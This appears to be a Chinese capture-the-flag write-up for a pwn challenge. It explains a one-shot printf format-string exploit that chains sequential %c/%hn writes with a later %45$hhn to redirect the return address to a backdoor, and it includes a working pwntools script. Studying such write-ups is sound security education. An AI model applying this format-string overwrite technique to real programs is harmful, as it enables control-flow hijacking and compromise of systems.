# One Chance!

## 题目简述

程序只调用一次存在漏洞的 `printf`，格式串位于 `.bss`，并直接给出一个栈地址和后门。栈上有指针链，但同一次格式化字符串中若过早使用 `%15$...` 这类位置参数，glibc 会先解析后续位置参数的目标地址，导致“先改指针、再经该指针写返回地址”的计划失效。

## 解题过程

第一段故意不用 `$` 位置参数。连续 13 个 `%c` 消耗 13 个参数，再用一个带宽度的 `%c` 消耗第 14 个参数，紧随其后的 `%hn` 自然使用第 15 个参数。这样可先把该栈上指针的低 16 位改成保存返回地址的位置。

完成第一次写后，才出现 `%45$hhn`。它经刚修改好的指针只覆盖返回地址最低字节；PIE 不影响同一映像内页内偏移，而本题原返回点与后门只在最低字节上不同。

```python
from pwn import ELF, log, remote

elf = ELF("./pwn")
io = remote("host", 10000)

io.recvuntil(b"0x")
saved_ret = int(io.recvn(12), 16) + 0x18
low_ret = saved_ret & 0xFFFF
backdoor_low = elf.sym["b2c4do0r"] & 0xFF
log.success(f"saved return address: {saved_ret:#x}")

# 非位置参数阶段：第 15 个顺序参数执行 %hn。
payload = "%c" * 13
payload += f"%{low_ret - 13}c%hn"

# 把累计打印数推进到低字节等于 backdoor_low 的下一个值。
target_count = ((low_ret + 0xFF) & ~0xFF) + backdoor_low
payload += f"%{target_count - low_ret}c%45$hhn"

io.sendlineafter(b"chance", payload.encode())
io.interactive()
```

混用顺序参数和位置参数不是可移植的 ISO C 写法，此利用依赖题目所用 glibc 的解析行为，换 libc 后应重新验证。

## 方法总结

本题难点不是 `%n` 的基本用法，而是格式串参数何时被解析。只有一次调用时，可以先用顺序参数完成指针重定向，再让后出现的位置参数取到修改后的目标；最终用 `%hhn` 只写一字节，避免破坏 PIE 地址的正确高位。
